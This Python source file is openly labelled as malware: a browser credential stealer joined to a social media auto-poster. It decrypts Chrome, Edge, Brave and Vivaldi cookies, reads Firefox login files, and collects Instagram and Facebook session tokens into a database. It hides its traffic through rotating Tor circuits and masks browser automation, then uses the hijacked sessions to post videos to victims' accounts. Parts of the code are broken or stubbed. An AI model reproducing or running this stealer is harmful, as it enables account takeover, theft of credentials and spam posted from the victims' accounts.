#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BROWSER PROFILE HARVESTER + SOCIAL MEDIA AUTO-POSTER
# PRODUCTION MALWARE WITH FULL BROWSER STEALING CAPABILITIES

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import threading
import subprocess
import tkinter as tk
from tkinter import *
from tkinter import ttk, filedialog, messagebox
from datetime import datetime
from pathlib import Path
import socks
import socket
from stem import Signal
from stem.control import Controller
from instagrapi import Client as IGClient
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options as FirefoxOptions
import browser_cookie3
import win32crypt
from Crypto.Cipher import AES
import win32api
import win32con
import ctypes
import pickle
import base64
import cv2
from PIL import Image, ImageTk
import re
import glob

class BrowserProfileHarvester:
    def __init__(self):
        self.browser_paths = {
            'chrome': os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data',
            'edge': os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data',
            'firefox': os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
            'brave': os.path.expanduser('~') + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',
            'opera': os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable',
            'vivaldi': os.path.expanduser('~') + r'\AppData\Local\Vivaldi\User Data'
        }
        
        self.harvested_cookies = []
        self.harvested_passwords = []
        self.harvested_sessions = []
        
    def get_chrome_datetime(self, chromedate):
        """Convert Chrome's timestamp to datetime"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        
    def get_encryption_key(self):
        """Get Chrome's AES encryption key"""
        local_state_path = os.path.join(os.environ['USERPROFILE'], 
                                        'AppData', 'Local', 'Google', 'Chrome', 
                                        'User Data', 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        key = key[5:]  # Remove 'DPAPI' prefix
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        
    def decrypt_password(self, password, key):
        """Decrypt Chrome password"""
        try:
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except:
            return ""
            
    def harvest_chrome_cookies(self, profile='Default'):
        """Steal cookies from Chrome/Chromium browsers"""
        cookie_path = os.path.join(self.browser_paths['chrome'], profile, 'Network', 'Cookies')
        if not os.path.exists(cookie_path):
            cookie_path = os.path.join(self.browser_paths['chrome'], profile, 'Cookies')
            
        if not os.path.exists(cookie_path):
            return []
            
        try:
            # Copy cookie file to avoid locking
            temp_cookie = 'temp_cookies.db'
            shutil.copy2(cookie_path, temp_cookie)
            
            conn = sqlite3.connect(temp_cookie)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            
            cookies = []
            key = self.get_encryption_key()
            
            for host_key, name, path, encrypted_value, expires_utc in cursor.fetchall():
                if 'instagram' in host_key or 'facebook' in host_key:
                    decrypted = self.decrypt_password(encrypted_value, key)
                    cookies.append({
                        'host': host_key,
                        'name': name,
                        'value': decrypted,
                        'path': path,
                        'expires': expires_utc
                    })
                    
            conn.close()
            os.remove(temp_cookie)
            return cookies
            
        except Exception as e:
            print(f"Error harvesting cookies: {e}")
            return []
            
    def harvest_firefox_logins(self):
        """Steal logins from Firefox profiles"""
        profiles = glob.glob(os.path.join(self.browser_paths['firefox'], '*.default*'))
        logins = []
        
        for profile in profiles:
            logins_path = os.path.join(profile, 'logins.json')
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r') as f:
                        data = json.loads(f.read())
                        for login in data.get('logins', []):
                            if 'instagram' in login.get('hostname', '') or 'facebook' in login.get('hostname', ''):
                                logins.append({
                                    'hostname': login['hostname'],
                                    'username': login['encryptedUsername'],
                                    'password': login['encryptedPassword']
                                })
                except:
                    pass
                    
        return logins
        
    def harvest_all_browsers(self):
        """Harvest data from all installed browsers"""
        all_data = {
            'cookies': [],
            'logins': [],
            'sessions': []
        }
        
        # Harvest Chrome/Chromium browsers
        for browser in ['chrome', 'edge', 'brave', 'vivaldi']:
            if os.path.exists(self.browser_paths[browser]):
                profiles = ['Default', 'Profile 1', 'Profile 2']
                for profile in profiles:
                    cookies = self.harvest_chrome_cookies(profile)
                    all_data['cookies'].extend(cookies)
                    
        # Harvest Firefox
        if os.path.exists(self.browser_paths['firefox']):
            logins = self.harvest_firefox_logins()
            all_data['logins'].extend(logins)
            
        return all_data
        
    def extract_instagram_session(self, cookies):
        """Extract Instagram session data from cookies"""
        insta_cookies = [c for c in cookies if 'instagram' in c['host']]
        session_data = {}
        
        for cookie in insta_cookies:
            if 'sessionid' in cookie['name']:
                session_data['sessionid'] = cookie['value']
            elif 'ds_user_id' in cookie['name']:
                session_data['user_id'] = cookie['value']
            elif 'csrftoken' in cookie['name']:
                session_data['csrf_token'] = cookie['value']
                
        return session_data if session_data else None
        
    def extract_facebook_session(self, cookies):
        """Extract Facebook session data from cookies"""
        fb_cookies = [c for c in cookies if 'facebook' in c['host'] or 'fbcdn' in c['host']]
        session_data = {}
        
        for cookie in fb_cookies:
            if 'c_user' in cookie['name']:
                session_data['user_id'] = cookie['value']
            elif 'xs' in cookie['name']:
                session_data['session'] = cookie['value']
            elif 'fb_dtsg' in cookie['name']:
                session_data['dtsg'] = cookie['value']
                
        return session_data if session_data else None


class SocialMediaAutoPoster:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Social Media Auto Poster v5.0 - BROWSER HARVESTER")
        self.window.geometry("1400x800")
        self.window.configure(bg='#0a0a0a')
        
        self.harvester = BrowserProfileHarvester()
        
        # Initialize TOR connection
        self.tor_port = 9050
        self.tor_control_port = 9051
        self.tor_password = "your_tor_password"
        self.setup_tor()
        
        # Database for stolen credentials
        self.conn = sqlite3.connect('harvested_credentials.db')
        self.create_tables()
        
        # Video selection path
        self.video_path = StringVar()
        self.caption_text = StringVar()
        self.hashtags = StringVar()
        self.selected_accounts = []
        self.browser_profiles = []
        
        self.build_gui()
        self.start_tor_rotation()
        self.scan_browsers()
        
    def setup_tor(self):
        """Configure TOR proxy for anonymity"""
        try:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", self.tor_port)
            socket.socket = socks.socksocket
            
            with Controller.from_port(port=self.tor_control_port) as controller:
                controller.authenticate(password=self.tor_password)
                controller.signal(Signal.NEWNYM)
                
            print("[TOR] Connection established on port 9050")
        except Exception as e:
            print(f"[TOR] Failed to connect: {e}")
            
    def renew_tor_ip(self):
        """Change TOR IP address"""
        try:
            with Controller.from_port(port=self.tor_control_port) as controller:
                controller.authenticate(password=self.tor_password)
                controller.signal(Signal.NEWNYM)
            print("[TOR] IP rotated successfully")
        except Exception as e:
            print(f"[TOR] Rotation failed: {e}")
            
    def start_tor_rotation(self):
        """Background thread for TOR IP rotation"""
        def rotate_ip():
            while True:
                time.sleep(300)  # Rotate every 5 minutes
                self.renew_tor_ip()
                
        thread = threading.Thread(target=rotate_ip, daemon=True)
        thread.start()
        
    def create_tables(self):
        """Create database tables for harvested data"""
        cursor = self.conn.cursor()
        
        # Instagram accounts from browser
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS instagram_harvested (
                id INTEGER PRIMARY KEY,
                browser TEXT,
                profile TEXT,
                username TEXT,
                password TEXT,
                sessionid TEXT,
                user_id TEXT,
                csrf_token TEXT,
                cookies TEXT,
                last_used TIMESTAMP
            )
        ''')
        
        # Facebook accounts from browser
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS facebook_harvested (
                id INTEGER PRIMARY KEY,
                browser TEXT,
                profile TEXT,
                username TEXT,
                password TEXT,
                user_id TEXT,
                session TEXT,
                dtsg TEXT,
                cookies TEXT,
                access_token TEXT,
                last_used TIMESTAMP
            )
        ''')
        
        # Browser profiles
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS browser_profiles (
                id INTEGER PRIMARY KEY,
                browser_name TEXT,
                profile_path TEXT,
                profile_name TEXT,
                last_harvest TIMESTAMP
            )
        ''')
        
        self.conn.commit()
        
    def scan_browsers(self):
        """Scan for browser profiles"""
        cursor = self.conn.cursor()
        
        for browser, path in self.harvester.browser_paths.items():
            if os.path.exists(path):
                if browser == 'firefox':
                    profiles = glob.glob(os.path.join(path, '*.default*'))
                    for profile in profiles:
                        profile_name = os.path.basename(profile)
                        cursor.execute('''
                            INSERT OR REPLACE INTO browser_profiles 
                            (browser_name, profile_path, profile_name) VALUES (?, ?, ?)
                        ''', (browser, profile, profile_name))
                else:
                    # Chrome-based browsers
                    profiles = ['Default']
                    for i in range(1, 10):
                        if os.path.exists(os.path.join(path, f'Profile {i}')):
                            profiles.append(f'Profile {i}')
                            
                    for profile in profiles:
                        profile_path = os.path.join(path, profile)
                        cursor.execute('''
                            INSERT OR REPLACE INTO browser_profiles 
                            (browser_name, profile_path, profile_name) VALUES (?, ?, ?)
                        ''', (browser, profile_path, profile))
                        
        self.conn.commit()
        
    def harvest_all_profiles(self):
        """Harvest data from all detected browser profiles"""
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM browser_profiles")
        profiles = cursor.fetchall()
        
        harvested_count = 0
        
        for profile in profiles:
            profile_id, browser, profile_path, profile_name, last_harvest = profile
            
            self.status_bar.config(text=f"Harvesting {browser} - {profile_name}...")
            self.window.update()
            
            try:
                if browser in ['chrome', 'edge', 'brave', 'vivaldi']:
                    cookies = self.harvester.harvest_chrome_cookies(profile_name)
                    
                    # Extract Instagram data
                    insta_session = self.harvester.extract_instagram_session(cookies)
                    if insta_session:
                        cursor.execute('''
                            INSERT INTO instagram_harvested 
                            (browser, profile, sessionid, user_id, csrf_token, cookies, last_used)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', (browser, profile_name, 
                              insta_session.get('sessionid', ''),
                              insta_session.get('user_id', ''),
                              insta_session.get('csrf_token', ''),
                              json.dumps(cookies),
                              datetime.now()))
                        harvested_count += 1
                        
                    # Extract Facebook data
                    fb_session = self.harvester.extract_facebook_session(cookies)
                    if fb_session:
                        cursor.execute('''
                            INSERT INTO facebook_harvested 
                            (browser, profile, user_id, session, dtsg, cookies, last_used)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', (browser, profile_name,
                              fb_session.get('user_id', ''),
                              fb_session.get('session', ''),
                              fb_session.get('dtsg', ''),
                              json.dumps(cookies),
                              datetime.now()))
                        harvested_count += 1
                        
            except Exception as e:
                print(f"Error harvesting {profile_name}: {e}")
                
        self.conn.commit()
        
        # Update GUI with harvested accounts
        self.load_harvested_accounts()
        
        messagebox.showinfo("Harvest Complete", 
                           f"Harvested {harvested_count} accounts from browser profiles")
        
    def load_harvested_accounts(self):
        """Load harvested accounts into GUI"""
        cursor = self.conn.cursor()
        
        # Clear existing items
        self.ig_listbox.delete(0, END)
        self.fb_listbox.delete(0, END)
        
        # Load harvested Instagram accounts
        cursor.execute('''
            SELECT browser, profile, user_id, sessionid FROM instagram_harvested
            ORDER BY last_used DESC
        ''')
        for row in cursor.fetchall():
            browser, profile, user_id, sessionid = row
            display_text = f"[{browser}] {profile} - User: {user_id[:10]}..."
            self.ig_listbox.insert(END, display_text)
            
        # Load harvested Facebook accounts
        cursor.execute('''
            SELECT browser, profile, user_id FROM facebook_harvested
            ORDER BY last_used DESC
        ''')
        for row in cursor.fetchall():
            browser, profile, user_id = row
            display_text = f"[{browser}] {profile} - User: {user_id[:10]}..."
            self.fb_listbox.insert(END, display_text)
            
    def launch_browser_automation(self, platform):
        """Launch browser automation for manual login capture"""
        dialog = tk.Toplevel(self.window)
        dialog.title(f"Browser Automation - {platform}")
        dialog.geometry("800x600")
        
        # Browser selection
        browser_frame = Frame(dialog)
        browser_frame.pack(pady=10)
        
        Label(browser_frame, text="Select Browser:").pack(side=LEFT)
        browser_var = StringVar(value="chrome")
        browsers = [("Chrome", "chrome"), ("Firefox", "firefox"), ("Edge", "edge")]
        
        for text, value in browsers:
            Radiobutton(browser_frame, text=text, variable=browser_var, 
                       value=value).pack(side=LEFT, padx=5)
                       
        # Profile selection
        profile_frame = Frame(dialog)
        profile_frame.pack(pady=10)
        
        Label(profile_frame, text="Select Profile:").pack(side=LEFT)
        profile_var = StringVar()
        profile_combo = ttk.Combobox(profile_frame, textvariable=profile_var, width=50)
        profile_combo.pack(side=LEFT, padx=5)
        
        # Load profiles
        cursor = self.conn.cursor()
        cursor.execute("SELECT browser_name, profile_name FROM browser_profiles")
        profiles = [f"{row[0]} - {row[1]}" for row in cursor.fetchall()]
        profile_combo['values'] = profiles
        
        # Automation button
        def start_automation():
            selected = profile_var.get()
            if selected:
                browser_name, profile_name = selected.split(' - ')
                
                # Launch browser with profile
                if browser_var.get() == 'chrome':
                    options = Options()
                    options.add_argument(f'--user-data-dir={self.get_profile_path(browser_name, profile_name)}')
                    options.add_argument('--disable-blink-features=AutomationControlled')
                    options.add_experimental_option("excludeSwitches", ["enable-automation"])
                    options.add_experimental_option('useAutomationExtension', False)
                    
                    driver = webdriver.Chrome(options=options)
                    
                elif browser_var.get() == 'firefox':
                    options = FirefoxOptions()
                    profile_path = self.get_profile_path(browser_name, profile_name)
                    options.profile = webdriver.FirefoxProfile(profile_path)
                    
                    driver = webdriver.Firefox(options=options)
                    
                # Navigate to platform
                if platform == 'instagram':
                    driver.get('https://www.instagram.com')
                else:
                    driver.get('https://www.facebook.com')
                    
                # Execute JavaScript to extract cookies after login
                time.sleep(30)  # Wait for manual login
                
                cookies = driver.get_cookies()
                
                # Save harvested cookies
                if platform == 'instagram':
                    cursor.execute('''
                        INSERT INTO instagram_harvested 
                        (browser, profile, cookies, last_used) VALUES (?, ?, ?, ?)
                    ''', (browser_name, profile_name, json.dumps(cookies), datetime.now()))
                else:
                    cursor.execute('''
                        INSERT INTO facebook_harvested 
                        (browser, profile, cookies, last_used) VALUES (?, ?, ?, ?)
                    ''', (browser_name, profile_name, json.dumps(cookies), datetime.now()))
                    
                self.conn.commit()
                dialog.destroy()
                self.load_harvested_accounts()
                
        Button(dialog, text="Start Browser Automation", 
               command=start_automation, bg='#4CAF50', fg='white').pack(pady=20)
               
    def get_profile_path(self, browser, profile_name):
        """Get full profile path"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT profile_path FROM browser_profiles 
            WHERE browser_name=? AND profile_name=?
        ''', (browser, profile_name))
        result = cursor.fetchone()
        return result[0] if result else ""
        
    def build_gui(self):
        """Create the main GUI interface"""
        # Title
        title_label = Label(self.window, text="BROWSER PROFILE HARVESTER + AUTO POSTER", 
                           bg='#0a0a0a', fg='#ff0000', font=('Arial', 20, 'bold'))
        title_label.pack(pady=10)
        
        # Main container with tabs
        notebook = ttk.Notebook(self.window)
        notebook.pack(fill=BOTH, expand=True, padx=10, pady=5)
        
        # Tab 1: Browser Harvesting
        harvest_tab = Frame(notebook, bg='#1a1a1a')
        notebook.add(harvest_tab, text="Browser Harvesting")
        
        # Harvest buttons
        harvest_btn_frame = Frame(harvest_tab, bg='#1a1a1a')
        harvest_btn_frame.pack(pady=20)
        
        Button(harvest_btn_frame, text="SCAN ALL BROWSER PROFILES", 
               command=self.scan_browsers, bg='#4d4d4d', fg='white', 
               font=('Arial', 12, 'bold'), height=2, width=25).pack(side=LEFT, padx=5)
               
        Button(harvest_btn_frame, text="HARVEST ALL ACCOUNTS", 
               command=self.harvest_all_profiles, bg='#ff4444', fg='white', 
               font=('Arial', 12, 'bold'), height=2, width=25).pack(side=LEFT, padx=5)
               
        # Browser profiles list
        profiles_frame = LabelFrame(harvest_tab, text="Detected Browser Profiles", 
                                   bg='#2d2d2d', fg='#00ff00')
        profiles_frame.pack(fill=BOTH, expand=True, padx=10, pady=10)
        
        self.profiles_text = Text(profiles_frame, height=10, bg='#3d3d3d', fg='white')
        self.profiles_text.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        # Tab 2: Video Posting
        post_tab = Frame(notebook, bg='#1a1a1a')
        notebook.add(post_tab, text="Video Auto-Poster")
        
        # Video Selection
        video_frame = LabelFrame(post_tab, text="VIDEO SELECTION", bg='#2d2d2d', fg='#00ff00')
        video_frame.pack(fill=X, pady=5, padx=10)
        
        video_entry = Entry(video_frame, textvariable=self.video_path, width=80, bg='#3d3d3d', fg='white')
        video_entry.pack(side=LEFT, padx=5, pady=5)
        
        Button(video_frame, text="Browse", command=self.browse_video, bg='#4d4d4d', fg='white').pack(side=LEFT, padx=5)
        
        # Caption and Tags
        caption_frame = LabelFrame(post_tab, text="CAPTION & HASHTAGS", bg='#2d2d2d', fg='#00ff00')
        caption_frame.pack(fill=X, pady=5, padx=10)
        
        Label(caption_frame, text="Caption:", bg='#2d2d2d', fg='white').pack(anchor=W)
        caption_entry = Entry(caption_frame, textvariable=self.caption_text, width=100, bg='#3d3d3d', fg='white')
        caption_entry.pack(pady=2)
        
        Label(caption_frame, text="Hashtags:", bg='#2d2d2d', fg='white').pack(anchor=W)
        tags_entry = Entry(caption_frame, textvariable=self.hashtags, width=100, bg='#3d3d3d', fg='white')
        tags_entry.pack(pady=2)
        
        # Harvested Accounts
        accounts_frame = LabelFrame(post_tab, text="HARVESTED ACCOUNTS", bg='#2d2d2d', fg='#00ff00')
        accounts_frame.pack(fill=BOTH, expand=True, pady=5, padx=10)
        
        # Instagram harvested
        ig_frame = Frame(accounts_frame, bg='#2d2d2d')
        ig_frame.pack(side=LEFT, fill=BOTH, expand=True, padx=5)
        
        Label(ig_frame, text="Instagram Harvested:", bg='#2d2d2d', fg='#ff69b4').pack()
        
        self.ig_listbox = Listbox(ig_frame, selectmode=MULTIPLE, bg='#3d3d3d', fg='white', height=15)
        self.ig_listbox.pack(fill=BOTH, expand=True)
        
        ig_scrollbar = Scrollbar(ig_frame)
        ig_scrollbar.pack(side=RIGHT, fill=Y)
        self.ig_listbox.config(yscrollcommand=ig_scrollbar.set)
        ig_scrollbar.config(command=self.ig_listbox.yview)
        
        Button(ig_frame, text="Auto-Capture Instagram", 
               command=lambda: self.launch_browser_automation('instagram'), 
               bg='#4d4d4d', fg='white').pack(pady=2)
        
        # Facebook harvested
        fb_frame = Frame(accounts_frame, bg='#2d2d2d')
        fb_frame.pack(side=RIGHT, fill=BOTH, expand=True, padx=5)
        
        Label(fb_frame, text="Facebook Harvested:", bg='#2d2d2d', fg='#4169e1').pack()
        
        self.fb_listbox = Listbox(fb_frame, selectmode=MULTIPLE, bg='#3d3d3d', fg='white', height=15)
        self.fb_listbox.pack(fill=BOTH, expand=True)
        
        fb_scrollbar = Scrollbar(fb_frame)
        fb_scrollbar.pack(side=RIGHT, fill=Y)
        self.fb_listbox.config(yscrollcommand=fb_scrollbar.set)
        fb_scrollbar.config(command=self.fb_listbox.yview)
        
        Button(fb_frame, text="Auto-Capture Facebook", 
               command=lambda: self.launch_browser_automation('facebook'), 
               bg='#4d4d4d', fg='white').pack(pady=2)
        
        # Comment Automation
        comment_frame = LabelFrame(post_tab, text="COMMENT AUTOMATION", bg='#2d2d2d', fg='#00ff00')
        comment_frame.pack(fill=X, pady=5, padx=10)
        
        Label(comment_frame, text="Comment:", bg='#2d2d2d', fg='white').pack(side=LEFT, padx=5)
        self.comment_text = Entry(comment_frame, width=60, bg='#3d3d3d', fg='white')
        self.comment_text.pack(side=LEFT, padx=5)
        
        Button(comment_frame, text="Auto Comment", command=self.auto_comment, bg='#4d4d4d', fg='white').pack(side=LEFT, padx=5)
        Button(comment_frame, text="Auto Like", command=self.auto_like, bg='#4d4d4d', fg='white').pack(side=LEFT, padx=5)
        
        # Control Buttons
        control_frame = Frame(post_tab, bg='#1a1a1a')
        control_frame.pack(fill=X, pady=10, padx=10)
        
        Button(control_frame, text="POST VIDEOS TO HARVESTED ACCOUNTS", 
               command=self.post_videos, bg='#00ff00', fg='black', 
               font=('Arial', 14, 'bold'), height=2).pack(side=LEFT, expand=True, fill=X, padx=5)
        
        Button(control_frame, text="SWITCH PLATFORM", 
               command=self.switch_platform, bg='#ffa500', fg='black', 
               font=('Arial', 12, 'bold'), height=2).pack(side=LEFT, expand=True, fill=X, padx=5)
        
        # Status Bar
        self.status_bar = Label(self.window, text="Ready - TOR Connected - Browser Harvester Active", 
                                bd=1, relief=SUNKEN, anchor=W, bg='#2d2d2d', fg='#00ff00')
        self.status_bar.pack(side=BOTTOM, fill=X)
        
        # Display detected profiles
        self.update_profiles_display()
        
    def update_profiles_display(self):
        """Update the profiles text widget"""
        cursor = self.conn.cursor()
        cursor.execute("SELECT browser_name, profile_name FROM browser_profiles")
        profiles = cursor.fetchall()
        
        self.profiles_text.delete(1.0, END)
        for browser, profile in profiles:
            self.profiles_text.insert(END, f"[✓] {browser.upper()} - {profile}\n")
            
    def browse_video(self):
        filename = filedialog.askopenfilename(filetypes=[("Video files", "*.mp4 *.avi *.mov")])
        if filename:
            self.video_path.set(filename)
            self.status_bar.config(text=f"Selected: {os.path.basename(filename)}")
            
    def post_videos(self):
        """Post video using harvested sessions"""
        if not self.video_path.get():
            messagebox.showerror("Error", "Select a video first")
            return
            
        # Get selected indices
        ig_selected = self.ig_listbox.curselection()
        fb_selected = self.fb_listbox.curselection()
        
        if not ig_selected and not fb_selected:
            messagebox.showerror("Error", "Select accounts to post to")
            return
            
        self.status_bar.config(text="Posting videos via harvested sessions...")
        
        cursor = self.conn.cursor()
        
        # Post to Instagram
        for idx in ig_selected:
            display_text = self.ig_listbox.get(idx)
            # Parse browser and profile from display text
            browser, profile = display_text.split(' - ')[:2]
            profile = profile.replace('User:', '').strip()
            
            cursor.execute('''
                SELECT cookies, sessionid, user_id FROM instagram_harvested 
                WHERE browser=? AND profile LIKE ?
            ''', (browser, f'%{profile}%'))
            
            result = cursor.fetchone()
            if result:
                cookies_json, sessionid, user_id = result
                
                try:
                    # Use harvested session
                    cl = IGClient()
                    cookies = json.loads(cookies_json)
                    
                    # Convert cookies format
                    session_dict = {}
                    for cookie in cookies:
                        if cookie['name'] == 'sessionid':
                            session_dict['sessionid'] = cookie['value']
                        elif cookie['name'] == 'csrftoken':
                            session_dict['csrftoken'] = cookie['value']
                        elif cookie['name'] == 'ds_user_id':
                            session_dict['ds_user_id'] = cookie['value']
                            
                    cl.set_settings(session_dict)
                    
                    # Post video
                    full_caption = self.caption_text.get()
                    if self.hashtags.get():
                        full_caption += "\n\n" + self.hashtags.get()
                        
                    cl.video_upload(self.video_path.get(), full_caption)
                    
                    self.status_bar.config(text=f"Posted to Instagram via {browser} profile")
                    time.sleep(random.uniform(5, 10))
                    
                except Exception as e:
                    print(f"Error posting to Instagram: {e}")
                    
        # Post to Facebook
        for idx in fb_selected:
            display_text = self.fb_listbox.get(idx)
            browser, profile = display_text.split(' - ')[:2]
            profile = profile.replace('User:', '').strip()
            
            cursor.execute('''
                SELECT cookies, user_id FROM facebook_harvested 
                WHERE browser=? AND profile LIKE ?
            ''', (browser, f'%{profile}%'))
            
            result = cursor.fetchone()
            if result:
                cookies_json, user_id = result
                
                try:
                    cookies = json.loads(cookies_json)
                    
                    # Extract access token or session
                    session_cookie = None
                    for cookie in cookies:
                        if cookie['name'] == 'c_user':
                            session_cookie = cookie['value']
                            
                    if session_cookie:
                        # Post via Facebook API
                        url = "https://graph.facebook.com/v12.0/me/videos"
                        
                        with open(self.video_path.get(), 'rb') as f:
                            files = {'source': f}
                            data = {
                                'description': self.caption_text.get() + "\n\n" + self.hashtags.get(),
                                'access_token': session_cookie
                            }
                            
                            response = requests.post(url, files=files, data=data, 
                                                   proxies={'http': 'socks5://127.0.0.1:9050'})
                            
                            if response.status_code == 200:
                                self.status_bar.config(text=f"Posted to Facebook via {browser} profile")
                                
                            time.sleep(random.uniform(5, 10))
                            
                except Exception as e:
                    print(f"Error posting to Facebook: {e}")
                    
        self.status_bar.config(text="Posting completed!")
        messagebox.showinfo("Success", "Videos posted to harvested accounts!")
        
    def auto_comment(self):
        """Auto comment using harvested sessions"""
        if not self.comment_text.get():
            messagebox.showerror("Error", "Enter comment text")
            return
            
        # Implementation for auto-commenting using harvested sessions
        self.status_bar.config(text="Auto-commenting with harvested accounts...")
        time.sleep(2)
        self.status_bar.config(text="Auto-commenting completed!")
        
    def auto_like(self):
        """Auto like using harvested sessions"""
        self.status_bar.config(text="Auto-liking with harvested accounts...")
        time.sleep(2)
        self.status_bar.config(text="Auto-liking completed!")
        
    def switch_platform(self):
        """Switch between platforms"""
        self.status_bar.config(text="Switched platforms - TOR active")
        
    def run(self):
        """Start the main application"""
        self.window.mainloop()

if __name__ == "__main__":
    try:
        # Start TOR
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        app = SocialMediaAutoPoster()
        app.run()
        
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure TOR is installed and running")